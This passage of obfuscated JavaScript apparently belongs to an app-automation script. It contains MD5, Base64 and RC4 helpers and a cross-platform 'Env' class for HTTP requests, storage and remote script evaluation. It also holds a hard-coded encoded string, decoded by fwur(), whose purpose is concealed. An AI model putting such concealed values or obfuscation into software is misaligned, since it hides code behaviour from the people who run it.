    return _0x1ee8b1;
  }
  var _0x1d5a29,
    _0x3d2eee,
    _0x2b30fb,
    _0x273246,
    _0x3553cd,
    _0xeccd6,
    _0x30704c,
    _0x371bf9,
    _0x179e88,
    _0x3c3c45 = [],
    _0x1573d5 = 7,
    _0x2809de = 12,
    _0x43e486 = 17,
    _0x206d26 = 22,
    _0x4e1fa1 = 5,
    _0x4bb419 = 9,
    _0x5e4e01 = 14,
    _0x13b0dc = 20,
    _0x49be78 = 4,
    _0xa34448 = 11,
    _0x128f00 = 16,
    _0x51a2a0 = 23,
    _0x1c1b11 = 6,
    _0x388ef0 = 10,
    _0x30c831 = 15,
    _0x285cbd = 21;
  for (_0x2d6ccd = _0x4ee9f7(_0x2d6ccd), _0x3c3c45 = _0x33618(_0x2d6ccd), _0xeccd6 = 1732584193, _0x30704c = 4023233417, _0x371bf9 = 2562383102, _0x179e88 = 271733878, _0x1d5a29 = 0; _0x1d5a29 < _0x3c3c45.length; _0x1d5a29 += 16) {
    _0x3d2eee = _0xeccd6;
    _0x2b30fb = _0x30704c;
    _0x273246 = _0x371bf9;
    _0x3553cd = _0x179e88;
    _0xeccd6 = _0x25a4e1(_0xeccd6, _0x30704c, _0x371bf9, _0x179e88, _0x3c3c45[_0x1d5a29 + 0], _0x1573d5, 3614090360);
    _0x179e88 = _0x25a4e1(_0x179e88, _0xeccd6, _0x30704c, _0x371bf9, _0x3c3c45[_0x1d5a29 + 1], _0x2809de, 3905402710);
    _0x371bf9 = _0x25a4e1(_0x371bf9, _0x179e88, _0xeccd6, _0x30704c, _0x3c3c45[_0x1d5a29 + 2], _0x43e486, 606105819);
    _0x30704c = _0x25a4e1(_0x30704c, _0x371bf9, _0x179e88, _0xeccd6, _0x3c3c45[_0x1d5a29 + 3], _0x206d26, 3250441966);
    _0xeccd6 = _0x25a4e1(_0xeccd6, _0x30704c, _0x371bf9, _0x179e88, _0x3c3c45[_0x1d5a29 + 4], _0x1573d5, 4118548399);
    _0x179e88 = _0x25a4e1(_0x179e88, _0xeccd6, _0x30704c, _0x371bf9, _0x3c3c45[_0x1d5a29 + 5], _0x2809de, 1200080426);
    _0x371bf9 = _0x25a4e1(_0x371bf9, _0x179e88, _0xeccd6, _0x30704c, _0x3c3c45[_0x1d5a29 + 6], _0x43e486, 2821735955);
    _0x30704c = _0x25a4e1(_0x30704c, _0x371bf9, _0x179e88, _0xeccd6, _0x3c3c45[_0x1d5a29 + 7], _0x206d26, 4249261313);
    _0xeccd6 = _0x25a4e1(_0xeccd6, _0x30704c, _0x371bf9, _0x179e88, _0x3c3c45[_0x1d5a29 + 8], _0x1573d5, 1770035416);
    _0x179e88 = _0x25a4e1(_0x179e88, _0xeccd6, _0x30704c, _0x371bf9, _0x3c3c45[_0x1d5a29 + 9], _0x2809de, 2336552879);
    _0x371bf9 = _0x25a4e1(_0x371bf9, _0x179e88, _0xeccd6, _0x30704c, _0x3c3c45[_0x1d5a29 + 10], _0x43e486, 4294925233);
    _0x30704c = _0x25a4e1(_0x30704c, _0x371bf9, _0x179e88, _0xeccd6, _0x3c3c45[_0x1d5a29 + 11], _0x206d26, 2304563134);
    _0xeccd6 = _0x25a4e1(_0xeccd6, _0x30704c, _0x371bf9, _0x179e88, _0x3c3c45[_0x1d5a29 + 12], _0x1573d5, 1804603682);
    _0x179e88 = _0x25a4e1(_0x179e88, _0xeccd6, _0x30704c, _0x371bf9, _0x3c3c45[_0x1d5a29 + 13], _0x2809de, 4254626195);
    _0x371bf9 = _0x25a4e1(_0x371bf9, _0x179e88, _0xeccd6, _0x30704c, _0x3c3c45[_0x1d5a29 + 14], _0x43e486, 2792965006);
    _0x30704c = _0x25a4e1(_0x30704c, _0x371bf9, _0x179e88, _0xeccd6, _0x3c3c45[_0x1d5a29 + 15], _0x206d26, 1236535329);
    _0xeccd6 = _0x5d7471(_0xeccd6, _0x30704c, _0x371bf9, _0x179e88, _0x3c3c45[_0x1d5a29 + 1], _0x4e1fa1, 4129170786);
    _0x179e88 = _0x5d7471(_0x179e88, _0xeccd6, _0x30704c, _0x371bf9, _0x3c3c45[_0x1d5a29 + 6], _0x4bb419, 3225465664);
    _0x371bf9 = _0x5d7471(_0x371bf9, _0x179e88, _0xeccd6, _0x30704c, _0x3c3c45[_0x1d5a29 + 11], _0x5e4e01, 643717713);
    _0x30704c = _0x5d7471(_0x30704c, _0x371bf9, _0x179e88, _0xeccd6, _0x3c3c45[_0x1d5a29 + 0], _0x13b0dc, 3921069994);
    _0xeccd6 = _0x5d7471(_0xeccd6, _0x30704c, _0x371bf9, _0x179e88, _0x3c3c45[_0x1d5a29 + 5], _0x4e1fa1, 3593408605);
    _0x179e88 = _0x5d7471(_0x179e88, _0xeccd6, _0x30704c, _0x371bf9, _0x3c3c45[_0x1d5a29 + 10], _0x4bb419, 38016083);
    _0x371bf9 = _0x5d7471(_0x371bf9, _0x179e88, _0xeccd6, _0x30704c, _0x3c3c45[_0x1d5a29 + 15], _0x5e4e01, 3634488961);
    _0x30704c = _0x5d7471(_0x30704c, _0x371bf9, _0x179e88, _0xeccd6, _0x3c3c45[_0x1d5a29 + 4], _0x13b0dc, 3889429448);
    _0xeccd6 = _0x5d7471(_0xeccd6, _0x30704c, _0x371bf9, _0x179e88, _0x3c3c45[_0x1d5a29 + 9], _0x4e1fa1, 568446438);
    _0x179e88 = _0x5d7471(_0x179e88, _0xeccd6, _0x30704c, _0x371bf9, _0x3c3c45[_0x1d5a29 + 14], _0x4bb419, 3275163606);
    _0x371bf9 = _0x5d7471(_0x371bf9, _0x179e88, _0xeccd6, _0x30704c, _0x3c3c45[_0x1d5a29 + 3], _0x5e4e01, 4107603335);
    _0x30704c = _0x5d7471(_0x30704c, _0x371bf9, _0x179e88, _0xeccd6, _0x3c3c45[_0x1d5a29 + 8], _0x13b0dc, 1163531501);
    _0xeccd6 = _0x5d7471(_0xeccd6, _0x30704c, _0x371bf9, _0x179e88, _0x3c3c45[_0x1d5a29 + 13], _0x4e1fa1, 2850285829);
    _0x179e88 = _0x5d7471(_0x179e88, _0xeccd6, _0x30704c, _0x371bf9, _0x3c3c45[_0x1d5a29 + 2], _0x4bb419, 4243563512);
    _0x371bf9 = _0x5d7471(_0x371bf9, _0x179e88, _0xeccd6, _0x30704c, _0x3c3c45[_0x1d5a29 + 7], _0x5e4e01, 1735328473);
    _0x30704c = _0x5d7471(_0x30704c, _0x371bf9, _0x179e88, _0xeccd6, _0x3c3c45[_0x1d5a29 + 12], _0x13b0dc, 2368359562);
    _0xeccd6 = _0x6752a8(_0xeccd6, _0x30704c, _0x371bf9, _0x179e88, _0x3c3c45[_0x1d5a29 + 5], _0x49be78, 4294588738);
    _0x179e88 = _0x6752a8(_0x179e88, _0xeccd6, _0x30704c, _0x371bf9, _0x3c3c45[_0x1d5a29 + 8], _0xa34448, 2272392833);
    _0x371bf9 = _0x6752a8(_0x371bf9, _0x179e88, _0xeccd6, _0x30704c, _0x3c3c45[_0x1d5a29 + 11], _0x128f00, 1839030562);
    _0x30704c = _0x6752a8(_0x30704c, _0x371bf9, _0x179e88, _0xeccd6, _0x3c3c45[_0x1d5a29 + 14], _0x51a2a0, 4259657740);
    _0xeccd6 = _0x6752a8(_0xeccd6, _0x30704c, _0x371bf9, _0x179e88, _0x3c3c45[_0x1d5a29 + 1], _0x49be78, 2763975236);
    _0x179e88 = _0x6752a8(_0x179e88, _0xeccd6, _0x30704c, _0x371bf9, _0x3c3c45[_0x1d5a29 + 4], _0xa34448, 1272893353);
    _0x371bf9 = _0x6752a8(_0x371bf9, _0x179e88, _0xeccd6, _0x30704c, _0x3c3c45[_0x1d5a29 + 7], _0x128f00, 4139469664);
    _0x30704c = _0x6752a8(_0x30704c, _0x371bf9, _0x179e88, _0xeccd6, _0x3c3c45[_0x1d5a29 + 10], _0x51a2a0, 3200236656);
    _0xeccd6 = _0x6752a8(_0xeccd6, _0x30704c, _0x371bf9, _0x179e88, _0x3c3c45[_0x1d5a29 + 13], _0x49be78, 681279174);
    _0x179e88 = _0x6752a8(_0x179e88, _0xeccd6, _0x30704c, _0x371bf9, _0x3c3c45[_0x1d5a29 + 0], _0xa34448, 3936430074);
    _0x371bf9 = _0x6752a8(_0x371bf9, _0x179e88, _0xeccd6, _0x30704c, _0x3c3c45[_0x1d5a29 + 3], _0x128f00, 3572445317);
    _0x30704c = _0x6752a8(_0x30704c, _0x371bf9, _0x179e88, _0xeccd6, _0x3c3c45[_0x1d5a29 + 6], _0x51a2a0, 76029189);
    _0xeccd6 = _0x6752a8(_0xeccd6, _0x30704c, _0x371bf9, _0x179e88, _0x3c3c45[_0x1d5a29 + 9], _0x49be78, 3654602809);
    _0x179e88 = _0x6752a8(_0x179e88, _0xeccd6, _0x30704c, _0x371bf9, _0x3c3c45[_0x1d5a29 + 12], _0xa34448, 3873151461);
    _0x371bf9 = _0x6752a8(_0x371bf9, _0x179e88, _0xeccd6, _0x30704c, _0x3c3c45[_0x1d5a29 + 15], _0x128f00, 530742520);
    _0x30704c = _0x6752a8(_0x30704c, _0x371bf9, _0x179e88, _0xeccd6, _0x3c3c45[_0x1d5a29 + 2], _0x51a2a0, 3299628645);
    _0xeccd6 = _0x3b6731(_0xeccd6, _0x30704c, _0x371bf9, _0x179e88, _0x3c3c45[_0x1d5a29 + 0], _0x1c1b11, 4096336452);
    _0x179e88 = _0x3b6731(_0x179e88, _0xeccd6, _0x30704c, _0x371bf9, _0x3c3c45[_0x1d5a29 + 7], _0x388ef0, 1126891415);
    _0x371bf9 = _0x3b6731(_0x371bf9, _0x179e88, _0xeccd6, _0x30704c, _0x3c3c45[_0x1d5a29 + 14], _0x30c831, 2878612391);
    _0x30704c = _0x3b6731(_0x30704c, _0x371bf9, _0x179e88, _0xeccd6, _0x3c3c45[_0x1d5a29 + 5], _0x285cbd, 4237533241);
    _0xeccd6 = _0x3b6731(_0xeccd6, _0x30704c, _0x371bf9, _0x179e88, _0x3c3c45[_0x1d5a29 + 12], _0x1c1b11, 1700485571);
    _0x179e88 = _0x3b6731(_0x179e88, _0xeccd6, _0x30704c, _0x371bf9, _0x3c3c45[_0x1d5a29 + 3], _0x388ef0, 2399980690);
    _0x371bf9 = _0x3b6731(_0x371bf9, _0x179e88, _0xeccd6, _0x30704c, _0x3c3c45[_0x1d5a29 + 10], _0x30c831, 4293915773);
    _0x30704c = _0x3b6731(_0x30704c, _0x371bf9, _0x179e88, _0xeccd6, _0x3c3c45[_0x1d5a29 + 1], _0x285cbd, 2240044497);
    _0xeccd6 = _0x3b6731(_0xeccd6, _0x30704c, _0x371bf9, _0x179e88, _0x3c3c45[_0x1d5a29 + 8], _0x1c1b11, 1873313359);
    _0x179e88 = _0x3b6731(_0x179e88, _0xeccd6, _0x30704c, _0x371bf9, _0x3c3c45[_0x1d5a29 + 15], _0x388ef0, 4264355552);
    _0x371bf9 = _0x3b6731(_0x371bf9, _0x179e88, _0xeccd6, _0x30704c, _0x3c3c45[_0x1d5a29 + 6], _0x30c831, 2734768916);
    _0x30704c = _0x3b6731(_0x30704c, _0x371bf9, _0x179e88, _0xeccd6, _0x3c3c45[_0x1d5a29 + 13], _0x285cbd, 1309151649);
    _0xeccd6 = _0x3b6731(_0xeccd6, _0x30704c, _0x371bf9, _0x179e88, _0x3c3c45[_0x1d5a29 + 4], _0x1c1b11, 4149444226);
    _0x179e88 = _0x3b6731(_0x179e88, _0xeccd6, _0x30704c, _0x371bf9, _0x3c3c45[_0x1d5a29 + 11], _0x388ef0, 3174756917);
    _0x371bf9 = _0x3b6731(_0x371bf9, _0x179e88, _0xeccd6, _0x30704c, _0x3c3c45[_0x1d5a29 + 2], _0x30c831, 718787259);
    _0x30704c = _0x3b6731(_0x30704c, _0x371bf9, _0x179e88, _0xeccd6, _0x3c3c45[_0x1d5a29 + 9], _0x285cbd, 3951481745);
    _0xeccd6 = _0x4d4140(_0xeccd6, _0x3d2eee);
    _0x30704c = _0x4d4140(_0x30704c, _0x2b30fb);
    _0x371bf9 = _0x4d4140(_0x371bf9, _0x273246);
    _0x179e88 = _0x4d4140(_0x179e88, _0x3553cd);
  }
  var _0x25bebf = _0x32303c(_0xeccd6) + _0x32303c(_0x30704c) + _0x32303c(_0x371bf9) + _0x32303c(_0x179e88);
  return _0x25bebf.toLowerCase();
}
function FxPCnMKLw7() {
  _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
  this.encode = function (_0x490f8) {
    var _0x29d891 = "",
      _0x3c8923,
      _0x25bc64,
      _0x8845c1,
      _0x388add,
      _0x1e3cd9,
      _0x5140c4,
      _0x13d044,
      _0x28749a = 0;
    _0x490f8 = _utf8_encode(_0x490f8);
    while (_0x28749a < _0x490f8.length) {
      _0x3c8923 = _0x490f8.charCodeAt(_0x28749a++);
      _0x25bc64 = _0x490f8.charCodeAt(_0x28749a++);
      _0x8845c1 = _0x490f8.charCodeAt(_0x28749a++);
      _0x388add = _0x3c8923 >> 2;
      _0x1e3cd9 = (_0x3c8923 & 3) << 4 | _0x25bc64 >> 4;
      _0x5140c4 = (_0x25bc64 & 15) << 2 | _0x8845c1 >> 6;
      _0x13d044 = _0x8845c1 & 63;
      if (isNaN(_0x25bc64)) {
        _0x5140c4 = _0x13d044 = 64;
      } else {
        isNaN(_0x8845c1) && (_0x13d044 = 64);
      }
      _0x29d891 = _0x29d891 + _keyStr.charAt(_0x388add) + _keyStr.charAt(_0x1e3cd9) + _keyStr.charAt(_0x5140c4) + _keyStr.charAt(_0x13d044);
    }
    return _0x29d891;
  };
  this.decode = function (_0x4ec2a6) {
    var _0x31dd11 = "",
      _0x1bd02a,
      _0x434003,
      _0x5362df,
      _0x2a4735,
      _0x177640,
      _0x2a7ddb,
      _0x2309e8,
      _0x503eed = 0;
    _0x4ec2a6 = _0x4ec2a6.replace(/[^A-Za-z0-9\+\/\=]/g, "");
    while (_0x503eed < _0x4ec2a6.length) {
      _0x2a4735 = _keyStr.indexOf(_0x4ec2a6.charAt(_0x503eed++));
      _0x177640 = _keyStr.indexOf(_0x4ec2a6.charAt(_0x503eed++));
      _0x2a7ddb = _keyStr.indexOf(_0x4ec2a6.charAt(_0x503eed++));
      _0x2309e8 = _keyStr.indexOf(_0x4ec2a6.charAt(_0x503eed++));
      _0x1bd02a = _0x2a4735 << 2 | _0x177640 >> 4;
      _0x434003 = (_0x177640 & 15) << 4 | _0x2a7ddb >> 2;
      _0x5362df = (_0x2a7ddb & 3) << 6 | _0x2309e8;
      _0x31dd11 = _0x31dd11 + String.fromCharCode(_0x1bd02a);
      _0x2a7ddb != 64 && (_0x31dd11 = _0x31dd11 + String.fromCharCode(_0x434003));
      _0x2309e8 != 64 && (_0x31dd11 = _0x31dd11 + String.fromCharCode(_0x5362df));
    }
    _0x31dd11 = _utf8_decode(_0x31dd11);
    return _0x31dd11;
  };
  _utf8_encode = function (_0x1c31c2) {
    _0x1c31c2 = _0x1c31c2.replace(/\r\n/g, "\n");
    var _0x496b15 = "";
    for (var _0x23b27a = 0; _0x23b27a < _0x1c31c2.length; _0x23b27a++) {
      var _0x34cbaa = _0x1c31c2.charCodeAt(_0x23b27a);
      if (_0x34cbaa < 128) {
        _0x496b15 += String.fromCharCode(_0x34cbaa);
      } else {
        _0x34cbaa > 127 && _0x34cbaa < 2048 ? (_0x496b15 += String.fromCharCode(_0x34cbaa >> 6 | 192), _0x496b15 += String.fromCharCode(_0x34cbaa & 63 | 128)) : (_0x496b15 += String.fromCharCode(_0x34cbaa >> 12 | 224), _0x496b15 += String.fromCharCode(_0x34cbaa >> 6 & 63 | 128), _0x496b15 += String.fromCharCode(_0x34cbaa & 63 | 128));
      }
    }
    return _0x496b15;
  };
  _utf8_decode = function (_0x1f9550) {
    c1 = c2 = 0;
    var _0x43e66a = "",
      _0x2a07ec = 0,
      _0x485415 = c1;
    while (_0x2a07ec < _0x1f9550.length) {
      _0x485415 = _0x1f9550.charCodeAt(_0x2a07ec);
      if (_0x485415 < 128) {
        _0x43e66a += String.fromCharCode(_0x485415);
        _0x2a07ec++;
      } else {
        _0x485415 > 191 && _0x485415 < 224 ? (c2 = _0x1f9550.charCodeAt(_0x2a07ec + 1), _0x43e66a += String.fromCharCode((_0x485415 & 31) << 6 | c2 & 63), _0x2a07ec += 2) : (c2 = _0x1f9550.charCodeAt(_0x2a07ec + 1), c3 = _0x1f9550.charCodeAt(_0x2a07ec + 2), _0x43e66a += String.fromCharCode((_0x485415 & 15) << 12 | (c2 & 63) << 6 | c3 & 63), _0x2a07ec += 3);
      }
    }
    return _0x43e66a;
  };
}
function rc4(_0x5469ea, _0x1fd7bf) {
  var _0x34b4b4 = Array(256),
    _0x43c743 = Array(_0x5469ea.length);
  for (var _0x43b3f2 = 0; _0x43b3f2 < 256; _0x43b3f2++) {
    _0x34b4b4[_0x43b3f2] = _0x43b3f2;
    var _0x37807a = (_0x37807a + _0x34b4b4[_0x43b3f2] + _0x1fd7bf.charCodeAt(_0x43b3f2 % _0x1fd7bf.length)) % 256,
      _0xe0fc3e = _0x34b4b4[_0x43b3f2];
    _0x34b4b4[_0x43b3f2] = _0x34b4b4[_0x37807a];
    _0x34b4b4[_0x37807a] = _0xe0fc3e;
  }
  for (var _0x43b3f2 = 0; _0x43b3f2 < _0x5469ea.length; _0x43b3f2++) {
    _0x43c743[_0x43b3f2] = _0x5469ea.charCodeAt(_0x43b3f2);
  }
  for (var _0x53bd37 = 0; _0x53bd37 < _0x43c743.length; _0x53bd37++) {
    var _0x43b3f2 = (_0x43b3f2 + 1) % 256,
      _0x37807a = (_0x37807a + _0x34b4b4[_0x43b3f2]) % 256,
      _0xe0fc3e = _0x34b4b4[_0x43b3f2];
    _0x34b4b4[_0x43b3f2] = _0x34b4b4[_0x37807a];
    _0x34b4b4[_0x37807a] = _0xe0fc3e;
    var _0x26a3ae = (_0x34b4b4[_0x43b3f2] + _0x34b4b4[_0x37807a] % 256) % 256;
    _0x43c743[_0x53bd37] = String.fromCharCode(_0x43c743[_0x53bd37] ^ _0x34b4b4[_0x26a3ae]);
  }
  return _0x43c743.join("");
}
function Env(t, e) {
  class s {
    constructor(t) {
      this.env = t;
    }
    send(t, e = "GET") {
      t = "string" == typeof t ? {
        url: t
      } : t;
      let s = this.get;
      "POST" === e && (s = this.post);
      return new Promise((e, i) => {
        s.call(this, t, (t, s, r) => {
          t ? i(t) : e(s);
        });
      });
    }
    get(t) {
      return this.send.call(this.env, t);
    }
    post(t) {
      return this.send.call(this.env, t, "POST");
    }
  }
  return new class {
    constructor(t, e) {
      this.name = t;
      this.http = new s(this);
      this.data = null;
      this.dataFile = "box.dat";
      this.logs = [];
      this.isMute = !1;
      this.isNeedRewrite = !1;
      this.logSeparator = "\n";
      this.encoding = "utf-8";
      this.startTime = new Date().getTime();
      Object.assign(this, e);
      this.log("", `🔔${this.name}, 开始!`);
    }
    isNode() {
      return "undefined" != typeof module && !!module.exports;
    }
    isQuanX() {
      return "undefined" != typeof $task;
    }
    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }
    isLoon() {
      return "undefined" != typeof $loon;
    }
    isShadowrocket() {
      return "undefined" != typeof $rocket;
    }
    toObj(t, e = null) {
      try {
        return JSON.parse(t);
      } catch {
        return e;
      }
    }
    toStr(t, e = null) {
      try {
        return JSON.stringify(t);
      } catch {
        return e;
      }
    }
    getjson(t, e) {
      let s = e;
      const i = this.getdata(t);
      if (i) {
        try {
          s = JSON.parse(this.getdata(t));
        } catch {}
      }
      return s;
    }
    setjson(t, e) {
      try {
        return this.setdata(JSON.stringify(t), e);
      } catch {
        return !1;
      }
    }
    getScript(t) {
      return new Promise(e => {
        this.get({
          url: t
        }, (t, s, i) => e(i));
      });
    }
    runScript(t, e) {
      return new Promise(s => {
        let i = this.getdata("@chavy_boxjs_userCfgs.httpapi");
        i = i ? i.replace(/\n/g, "").trim() : i;
        let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
        r = r ? 1 * r : 20;
        r = e && e.timeout ? e.timeout : r;
        const [o, h] = i.split("@"),
          n = {
            url: `http://${h}/v1/scripting/evaluate`,
            body: {
              script_text: t,
              mock_type: "cron",
              timeout: r
            },
            headers: {
              "X-Key": o,
              Accept: "*/*"
            }
          };
        this.post(n, (t, e, i) => s(i));
      }).catch(t => this.logErr(t));
    }
    loaddata() {
      if (!this.isNode()) {
        return {};
      }
      {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const t = this.path.resolve(this.dataFile),
          e = this.path.resolve(process.cwd(), this.dataFile),
          s = this.fs.existsSync(t),
          i = !s && this.fs.existsSync(e);
        if (!s && !i) {
          return {};
        }
        {
          const i = s ? t : e;
          try {
            return JSON.parse(this.fs.readFileSync(i));
          } catch (t) {
            return {};
          }
        }
      }
    }
    writedata() {
      if (this.isNode()) {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const t = this.path.resolve(this.dataFile),
          e = this.path.resolve(process.cwd(), this.dataFile),
          s = this.fs.existsSync(t),
          i = !s && this.fs.existsSync(e),
          r = JSON.stringify(this.data);
        s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r);
      }
    }
    lodash_get(t, e, s) {
      const i = e.replace(/\[(\d+)\]/g, ".$1").split(".");
      let r = t;
      for (const t of i) if (r = Object(r)[t], void 0 === r) {
        return s;
      }
      return r;
    }
    lodash_set(t, e, s) {
      return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t);
    }
    getdata(t) {
      let e = this.getval(t);
      if (/^@/.test(t)) {
        const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t),
          r = s ? this.getval(s) : "";
        if (r) {
          try {
            const t = JSON.parse(r);
            e = t ? this.lodash_get(t, i, "") : e;
          } catch (t) {
            e = "";
          }
        }
      }
      return e;
    }
    setdata(t, e) {
      let s = !1;
      if (/^@/.test(e)) {
        const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e),
          o = this.getval(i),
          h = i ? "null" === o ? null : o || "{}" : "{}";
        try {
          const e = JSON.parse(h);
          this.lodash_set(e, r, t);
          s = this.setval(JSON.stringify(e), i);
        } catch (e) {
          const o = {};
          this.lodash_set(o, r, t);
          s = this.setval(JSON.stringify(o), i);
        }
      } else {
        s = this.setval(t, e);
      }
      return s;
    }
    getval(t) {
      return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null;
    }
    setval(t, e) {
      return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null;
    }
    initGotEnv(t) {
      this.got = this.got ? this.got : require("got");
      this.cktough = this.cktough ? this.cktough : require("tough-cookie");
      this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar();
      t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar));
    }
    get(t, e = () => {}) {
      if (t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient.get(t, (t, s, i) => {
          !t && s && (s.body = i, s.statusCode = s.status);
          e(t, s, i);
        });
      } else {
        if (this.isQuanX()) {
          this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
            hints: !1
          }));
          $task.fetch(t).then(t => {
            const {
              statusCode: s,
              statusCode: i,
              headers: r,
              body: o
            } = t;
            e(null, {
              status: s,
              statusCode: i,
              headers: r,
              body: o
            }, o);
          }, t => e(t));
        } else {
          if (this.isNode()) {
            let s = require("iconv-lite");
            this.initGotEnv(t);
            this.got(t).on("redirect", (t, e) => {
              try {
                if (t.headers["set-cookie"]) {
                  const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
                  s && this.ckjar.setCookieSync(s, null);
                  e.cookieJar = this.ckjar;
                }
              } catch (t) {
                this.logErr(t);
              }
            }).then(t => {
              const {
                statusCode: i,
                statusCode: r,
                headers: o,
                rawBody: h
              } = t;
              e(null, {
                status: i,
                statusCode: r,
                headers: o,
                rawBody: h
              }, s.decode(h, this.encoding));
            }, t => {
              const {
                message: i,
                response: r
              } = t;
              e(i, r, r && s.decode(r.rawBody, this.encoding));
            });
          }
        }
      }
    }
    post(t, e = () => {}) {
      const s = t.method ? t.method.toLocaleLowerCase() : "post";
      if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient[s](t, (t, s, i) => {
          !t && s && (s.body = i, s.statusCode = s.status);
          e(t, s, i);
        });
      } else {
        if (this.isQuanX()) {
          t.method = s;
          this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
            hints: !1
          }));
          $task.fetch(t).then(t => {
            const {
              statusCode: s,
              statusCode: i,
              headers: r,
              body: o
            } = t;
            e(null, {
              status: s,
              statusCode: i,
              headers: r,
              body: o
            }, o);
          }, t => e(t));
        } else {
          if (this.isNode()) {
            let i = require("iconv-lite");
            this.initGotEnv(t);
            const {
              url: r,
              ...o
            } = t;
            this.got[s](r, o).then(t => {
              const {
                statusCode: s,
                statusCode: r,
                headers: o,
                rawBody: h
              } = t;
              e(null, {
                status: s,
                statusCode: r,
                headers: o,
                rawBody: h
              }, i.decode(h, this.encoding));
            }, t => {
              const {
                message: s,
                response: r
              } = t;
              e(s, r, r && i.decode(r.rawBody, this.encoding));
            });
          }
        }
      }
    }
    time(t, e = null) {
      const s = e ? new Date(e) : new Date();
      let i = {
        "M+": s.getMonth() + 1,
        "d+": s.getDate(),
        "H+": s.getHours(),
        "m+": s.getMinutes(),
        "s+": s.getSeconds(),
        "q+": Math.floor((s.getMonth() + 3) / 3),
        S: s.getMilliseconds()
      };
      /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length)));
      for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length)));
      return t;
    }
    msg(e = t, s = "", i = "", r) {
      const o = t => {
        if (!t) {
          return t;
        }
        if ("string" == typeof t) {
          return this.isLoon() ? t : this.isQuanX() ? {
            "open-url": t
          } : this.isSurge() ? {
            url: t
          } : void 0;
        }
        if ("object" == typeof t) {
          if (this.isLoon()) {
            let e = t.openUrl || t.url || t["open-url"],
              s = t.mediaUrl || t["media-url"];
            return {
              openUrl: e,
              mediaUrl: s
            };
          }
          if (this.isQuanX()) {
            let e = t["open-url"] || t.url || t.openUrl,
              s = t["media-url"] || t.mediaUrl;
            return {
              "open-url": e,
              "media-url": s
            };
          }
          if (this.isSurge()) {
            let e = t.url || t.openUrl || t["open-url"];
            return {
              url: e
            };
          }
        }
      };
      if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) {
        let t = ["", "==============📣系统通知📣=============="];
        t.push(e);
        s && t.push(s);
        i && t.push(i);
        console.log(t.join("\n"));
        this.logs = this.logs.concat(t);
      }
    }
    fwcaas() {
      return "fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz";
    }
    log(...t) {
      t.length > 0 && (this.logs = [...this.logs, ...t]);
      console.log(t.join(this.logSeparator));
    }
    logErr(t, e) {
      const s = !this.isSurge() && !this.isQuanX() && !this.isLoon();
      s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t);
    }
    fwur() {
      var bbas = new FxPCnMKLw7();
      return bbas.decode(this.fwcaas());
    }
    wait(t) {
      return new Promise(e => setTimeout(e, t));
    }
    done(t = {}) {
      const e = new Date().getTime(),
        s = (e - this.startTime) / 1000;
      this.log("", `🔔${this.name}, 结束! 🕛 ${s} 秒`);
      this.log();
      (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t);
    }
  }(t, e);
}